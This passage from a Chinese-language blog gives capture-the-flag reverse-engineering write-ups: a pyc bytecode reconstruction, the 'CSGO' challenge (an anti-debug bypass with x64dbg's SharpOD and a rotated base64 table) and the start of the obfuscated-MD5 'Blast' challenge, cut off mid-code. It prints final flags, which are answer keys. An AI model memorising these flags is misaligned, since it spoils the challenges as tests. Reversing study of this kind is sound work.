class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">magic 03f30d0a</span><br><span class="line">moddate 6d4a695b (Tue Aug  7 15:29:49 2018)</span><br><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">argcount</span>&gt;</span> 0 <span class="tag">&lt;/<span class="name">argcount</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">nlocals</span>&gt;</span> 0<span class="tag">&lt;/<span class="name">nlocals</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">stacksize</span>&gt;</span> 5<span class="tag">&lt;/<span class="name">stacksize</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">flags</span>&gt;</span> 0040<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">      6400006401006c00005a00006400006402006c01006d02005a0200016400</span><br><span class="line">      006401006c03005a03006400006401006c04005a04006403005a05006404</span><br><span class="line">      008400005a06006405008400005a07006506006505006406002083010065</span><br><span class="line">      070065050064060064070021830100176506006505006407001f83010017</span><br><span class="line">      5a08006500006a090065080083010047486408005a080064010053</span><br><span class="line">   <span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">names</span>&gt;</span> (&#x27;base64&#x27;, &#x27;hashlib&#x27;, &#x27;md5&#x27;, &#x27;random&#x27;, &#x27;string&#x27;, &#x27;f&#x27;, &#x27;_&#x27;, &#x27;____&#x27;, &#x27;e&#x27;, &#x27;b64encode&#x27;)<span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">varnames</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">varnames</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">freevars</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">freevars</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">cellvars</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">cellvars</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filename</span>&gt;</span> &#x27;re2.py&#x27;<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span> &#x27;<span class="tag">&lt;<span class="name">module</span>&gt;</span>&#x27;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">firstlineno</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">firstlineno</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">consts</span>&gt;</span></span><br><span class="line">      -1</span><br><span class="line">      None</span><br><span class="line">      (&#x27;md5&#x27;,)</span><br><span class="line">      &#x27;flag&#123;*******&#125;&#x27;</span><br><span class="line">      <span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">argcount</span>&gt;</span> 1 <span class="tag">&lt;/<span class="name">argcount</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">nlocals</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">nlocals</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">stacksize</span>&gt;</span> 8<span class="tag">&lt;/<span class="name">stacksize</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">flags</span>&gt;</span> 0043<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">            6401006a00007401006a02007403006a04006402008302008301007d0100</span><br><span class="line">            6401007d02007846007405007406007c0000830100830100445d32007d03</span><br><span class="line">            007c02007407007408007c00007c0300198301007408007c01007c030064</span><br><span class="line">            0200161983010041830100377d0200713700577c020053</span><br><span class="line">         <span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">names</span>&gt;</span> (&#x27;join&#x27;, &#x27;random&#x27;, &#x27;sample&#x27;, &#x27;string&#x27;, &#x27;digits&#x27;, &#x27;range&#x27;, &#x27;len&#x27;, &#x27;chr&#x27;, &#x27;ord&#x27;)<span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">varnames</span>&gt;</span> (&#x27;b&#x27;, &#x27;__&#x27;, &#x27;___&#x27;, &#x27;i&#x27;)<span class="tag">&lt;/<span class="name">varnames</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">freevars</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">freevars</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">cellvars</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">cellvars</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">filename</span>&gt;</span> &#x27;re2.py&#x27;<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">name</span>&gt;</span> &#x27;_&#x27;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">firstlineno</span>&gt;</span> 7<span class="tag">&lt;/<span class="name">firstlineno</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">consts</span>&gt;</span></span><br><span class="line">            None</span><br><span class="line">            &#x27;&#x27;</span><br><span class="line">            4</span><br><span class="line">         <span class="tag">&lt;/<span class="name">consts</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">lnotab</span>&gt;</span> 00011e01060119013001<span class="tag">&lt;/<span class="name">lnotab</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">argcount</span>&gt;</span> 1 <span class="tag">&lt;/<span class="name">argcount</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">nlocals</span>&gt;</span> 2<span class="tag">&lt;/<span class="name">nlocals</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">stacksize</span>&gt;</span> 2<span class="tag">&lt;/<span class="name">stacksize</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">flags</span>&gt;</span> 0043<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">            7400008300007d01007c01006a01007c0000830100017c01006a02008300</span><br><span class="line">            0053</span><br><span class="line">         <span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">names</span>&gt;</span> (&#x27;md5&#x27;, &#x27;update&#x27;, &#x27;digest&#x27;)<span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">varnames</span>&gt;</span> (&#x27;a&#x27;, &#x27;___&#x27;)<span class="tag">&lt;/<span class="name">varnames</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">freevars</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">freevars</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">cellvars</span>&gt;</span> ()<span class="tag">&lt;/<span class="name">cellvars</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">filename</span>&gt;</span> &#x27;re2.py&#x27;<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">name</span>&gt;</span> &#x27;____&#x27;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">firstlineno</span>&gt;</span> 14<span class="tag">&lt;/<span class="name">firstlineno</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">consts</span>&gt;</span></span><br><span class="line">            None</span><br><span class="line">         <span class="tag">&lt;/<span class="name">consts</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">lnotab</span>&gt;</span> 000109010d01<span class="tag">&lt;/<span class="name">lnotab</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line">      12</span><br><span class="line">      19</span><br><span class="line">      &#x27;U1VQU05pSHdqCEJrQu7FS7Vngk1OTQ58qqghXmt2AUdrcFBBUEU=&#x27;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">consts</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">lnotab</span>&gt;</span> 0c0110010c010c020601090709052f010e01<span class="tag">&lt;/<span class="name">lnotab</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><p>找到<a href="https://github.com/hinus/railgun/blob/master/src/main/python/rgparser/show.py" target="_blank">项目地址</a><br>这种就自己写几个python程序让源码编译看看结构<br>但tmd python2 …<br>还不如直接硬猜…<br>…<br>佬给的代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">f = <span class="string">&#x27;flag&#123;*******&#125;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_</span>(<span class="params">b</span>):</span><br><span class="line">    __ = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.digits,<span class="number">4</span>))</span><br><span class="line">    ___ = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        ___ += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i])^<span class="built_in">ord</span>(__[i % <span class="number">4</span>]))</span><br><span class="line">    <span class="keyword">return</span> ___</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">____</span>(<span class="params">a</span>):</span><br><span class="line">    ___ = md5()</span><br><span class="line">    ___.update(a)</span><br><span class="line">    <span class="keyword">return</span> ___.digest()</span><br><span class="line">e = _(f[:<span class="number">12</span>])+____(f[<span class="number">12</span>:<span class="number">19</span>])+_(f[<span class="number">19</span>:])</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(e)</span><br><span class="line">e = <span class="string">&#x27;U1VQU05pSHdqCEJrQu7FS7Vngk1OTQ58qqghXmt2AUdrcFBBUEU=&#x27;</span></span><br></pre></td></tr></table></figure><p>然后就爆破md5 还原key…<br>最后得到:<br><strong>flag{PyC_1s_613u21i_N0t_Hard}</strong></p><hr><hr><p>以后有空再来慢慢推吧…<br>题目把dis段删掉后能推出这个来的真的是神仙 orz…</p><h1 id="羊城杯2023"><a href="#羊城杯2023" class="headerlink" title="羊城杯2023"></a>羊城杯2023</h1><h2 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h2><p>学习到了sharpOD orz<br>IDA的话没办法动调 至少很难动调<br>FindCrypt插件可以发现有base64加密<br>查看交叉引用 在汇编代码中定位到字串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000049B</span>144                 mov     [rsp+<span class="number">0</span>C8h+var_88], rcx</span><br><span class="line">.text:<span class="number">000000000049B</span>149                 mov     [rsp+<span class="number">0</span>C8h+var_80], rdi</span><br><span class="line">.text:<span class="number">000000000049B</span>14E                 mov     [rsp+<span class="number">0</span>C8h+var_70], rdx</span><br><span class="line">.text:<span class="number">000000000049B</span>153                 lea     rcx, BASE64_table_4D9278 ; <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm&quot;</span>...</span><br><span class="line">.text:<span class="number">000000000049B</span>15A                 movzx   ebx, byte ptr [rax+rcx+<span class="number">0B</span>h]</span><br><span class="line">.text:<span class="number">000000000049B</span>15F                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">000000000049B</span>161                 call    runtime_intstring</span><br><span class="line">.text:<span class="number">000000000049B</span>166                 mov     rcx, [rsp+<span class="number">0</span>C8h+var_88]</span><br><span class="line">.text:<span class="number">000000000049B</span>16B                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">000000000049B</span>16E                 mov     rsi, rbx</span><br><span class="line">.text:<span class="number">000000000049B</span>171                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">000000000049B</span>173                 mov     rbx, [rsp+<span class="number">0</span>C8h+var_70]</span><br><span class="line">.text:<span class="number">000000000049B</span>178                 call    runtime_concatstring2</span><br><span class="line">.text:<span class="number">000000000049B</span>17D                 mov     rcx, [rsp+<span class="number">0</span>C8h+var_80]</span><br><span class="line">.text:<span class="number">000000000049B</span>182                 inc     rcx</span><br><span class="line">.text:<span class="number">000000000049B</span>185                 mov     rdx, rax</span><br><span class="line">.text:<span class="number">000000000049B</span>188                 mov     rax, rcx</span><br><span class="line">.text:<span class="number">000000000049B</span>18B                 mov     rcx, rbx</span><br></pre></td></tr></table></figure><p>在main的汇编可以找到最后加密对比字符串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, rbx</span><br><span class="line">lea     rbx, aCpqebacrpNZepY ; <span class="string">&quot;cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP&quot;</span>...</span><br><span class="line">call    runtime_memequal</span><br><span class="line">test    al, al</span><br><span class="line">jnz     <span class="type">short</span> loc_49B282</span><br></pre></td></tr></table></figure><p>但是直接解发现是乱码<br>那么要么换表 要么base64后还进行了加密<br>但是看密文形式(&#x3D;) 只可能是换表 但只有上面找到的一处lea … ABCD…<br>理论可以动调查看<br>但IDA动调会直接while(1)卡死<br>反调试逻辑也比较复杂<br>这里学习到了用x64dbg的sharpOD插件过掉反调试的方法</p><p>搜索安装好插件 把默认勾上的都勾上<br>在x64中搜索ABCD… 定位到代码段<br>下个断点 就能运行了<br>输入flag后一直F9 可以发现出现了一个很大的循环 对base64表进行了变换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000B</span>5B14 | <span class="number">48</span>:<span class="number">895424</span> <span class="number">58</span>            | mov qword ptr ss:[rsp+<span class="number">58</span>],rdx           | [rsp+<span class="number">58</span>]:<span class="string">&quot;LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHI&quot;</span></span><br><span class="line"><span class="number">0000000000B</span>5B15 | <span class="number">48</span>:<span class="number">8</span>D0D <span class="number">1</span>EE10300        | lea rcx,qword ptr ds:[B99278]           | <span class="number">0000000000B</span>99278:<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span></span><br></pre></td></tr></table></figure><p>可以发现这里逻辑就是做了一个整体平移 那么提取出变表base64解密即可<br>flag: DASCTF{73913519-A0A6-5575-0F10-DDCBF50FA8CA}</p><hr><hr><p>抽空还得看看具体怎么反调试的 以及IDA怎么反反调试</p><p>其实通过这段代码(概率性的F5出来了)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v19 = (<span class="type">unsigned</span> __int8)BASE64_table_4D9278[v25 + <span class="number">11</span>];</span><br><span class="line">v8 = <span class="built_in">runtime_intstring</span>(</span><br><span class="line">       <span class="number">0</span>,</span><br><span class="line">       v19,</span><br><span class="line">       (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">       v24,</span><br><span class="line">       (<span class="type">int</span>)v25 + <span class="number">11</span>,</span><br><span class="line">       v12,</span><br><span class="line">       v13,</span><br><span class="line">       v14,</span><br><span class="line">       v15,</span><br><span class="line">       v53,</span><br><span class="line">       v59);</span><br><span class="line"><span class="built_in">LODWORD</span>(v9) = v19;</span><br></pre></td></tr></table></figure><p>可以猜到大致是移位11位 外面套了个64的循环 那么应该是取index赋值之类</p><h2 id="Blast"><a href="#Blast" class="headerlink" title="Blast"></a>Blast</h2><p>用D810稍微去了点混淆<br>main</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v45 = a1;</span><br><span class="line">  v44 = a2;</span><br><span class="line">  v43 = &amp;v8;</span><br><span class="line">  v42 = &amp;v8;</span><br><span class="line">  v41 = &amp;v8;</span><br><span class="line">  v40 = &amp;v8;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  s = (<span class="type">char</span> *)(&amp;v8 - <span class="number">4</span>);</span><br><span class="line">  v38 = &amp;v8 - <span class="number">4</span>;</span><br><span class="line">  v37 = &amp;v8 - <span class="number">24</span>;</span><br><span class="line">  v36 = &amp;v8 - <span class="number">4</span>;</span><br><span class="line">  v35 = &amp;v47;</span><br><span class="line">  v34 = &amp;v8 - <span class="number">4</span>;</span><br><span class="line">  v9 = <span class="built_in">HIDWORD</span>(a2);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v33 = *v41;</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &gt;= <span class="number">10</span> &amp;&amp; dword_40F9A8 &lt; <span class="number">10</span> );</span><br><span class="line">    v32 = v33;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v31 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> <span class="type">int</span>)a0123456789abcd);</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v30 = v32 &lt; v31;</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v30 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v29 = *v41;</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v28 = &amp;a0123456789abcd[v29];</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &gt;= <span class="number">10</span> &amp;&amp; dword_40F9A8 &lt; <span class="number">10</span> );</span><br><span class="line">    byte_40E060[*v41] = *v28;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v27 = *v41;</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> );</span><br><span class="line">    v26 = v27 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_40F9A8 &gt;= <span class="number">10</span> &amp;&amp; dword_40F9A8 &lt; <span class="number">10</span> )</span><br><span class="line">LABEL_38:</span><br><span class="line">      *v41 = v26;</span><br><span class="line">    *v41 = v26;</span><br><span class="line">    <span class="keyword">if</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">    <span class="keyword">while</span> ( dword_40F9A8 &gt;= <span class="number">10</span> &amp;&amp; dword_40F9A8 &lt; <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = <span class="built_in">gets</span>(INPUT);                            <span class="comment">// INPUT here</span></span><br><span class="line">  *v40 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">LABEL_16:</span><br><span class="line">    v24 = *v40;</span><br><span class="line">  <span class="keyword">while</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> );</span><br><span class="line">  v23 = v24 &lt; <span class="number">47</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v24 &lt; <span class="number">47</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = *v40;</span><br><span class="line">    *s = INPUT[v22];</span><br><span class="line">    <span class="built_in">sub_404010</span>(v37);                            <span class="comment">// md5常量初始化</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v21 = <span class="number">1</span>;</span><br><span class="line">      v20 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !((v21 | <span class="number">1</span>) &amp; (dword_40F9A8 &lt; <span class="number">10</span>) | ((<span class="type">unsigned</span> __int8)(~(dword_40F9A8 &lt; <span class="number">10</span>) | v21 ^ <span class="number">1</span>) ^ (((v21 &amp; <span class="number">1</span>) == <span class="number">0</span>) | <span class="number">0xFE</span>)) &amp; <span class="number">1</span>) );</span><br><span class="line">    <span class="keyword">if</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_404140</span>(v37, s, (<span class="type">unsigned</span> <span class="type">int</span>)v20);</span><br><span class="line">      <span class="built_in">sub_40A510</span>(v37, v38);</span><br><span class="line">      *v36 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dword_40F9A8 &gt;= <span class="number">10</span> || dword_40F9A8 &lt; <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_42:</span><br><span class="line">      <span class="built_in">sub_404140</span>(v37, s, (<span class="type">unsigned</span> <span class="type">int</span>)v20);</span><br><span class="line">      <span class="built_in">sub_40A510</span>(v37, v38);</span><br><span class="line">      *v36 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = *v36;</span><br><span class="line">      v18 = v19 &lt; <span class="number">16</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v19 &gt;= <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = *v40;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v9 = v10 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> );</span><br><span class="line">        *v40 = v9;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = *v36;</span><br><span class="line">      v16 = v17;</span><br><span class="line">      v15 = *((<span class="type">unsigned</span> __int8 *)v38 + v17);</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      v13 = <span class="number">16</span>;</span><br><span class="line">      v3 = v35;</span><br><span class="line">      *(_BYTE *)v35 = byte_40E060[v15 / <span class="number">16LL</span>];</span><br><span class="line">      v4 = v36;</span><br><span class="line">      v5 = v34;</span><br><span class="line">      *(_BYTE *)v34 = byte_40E060[*((<span class="type">unsigned</span> __int8 *)v38 + *v36) % <span class="number">16</span>];</span><br><span class="line">      v6 = v40;</span><br><span class="line">      byte_40E700[<span class="number">33</span> * *v40 + <span class="number">2</span> * *v4] = *(_BYTE *)v3;</span><br><span class="line">      byte_40E700[<span class="number">33</span> * *v6 + <span class="number">2</span> * *v4 - (v14 - <span class="number">1</span>)] = *(_BYTE *)v5;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v12 = *v36;</span><br><span class="line">      <span class="keyword">while</span> ( dword_40F9A8 &gt;= <span class="number">10</span> &amp;&amp; dword_40F9A8 &lt; <span class="number">10</span> );</span><br><span class="line">      v11 = v12 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dword_40F9A8 &gt;= <span class="number">10</span> &amp;&amp; dword_40F9A8 &lt; <span class="number">10</span> )</span><br><span class="line">LABEL_44:</span><br><span class="line">        *v36 = v11;</span><br><span class="line">      *v36 = v11;</span><br><span class="line">      <span class="keyword">if</span> ( dword_40F9A8 &lt; <span class="number">10</span> &amp;&amp; dword_40F9A8 &gt;= <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_402370</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着好多do-while 其实就只执行一次<br>FindCrypt找到md5加密特征 同时在sub_404010也找到md5常量<br>再加上找到的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 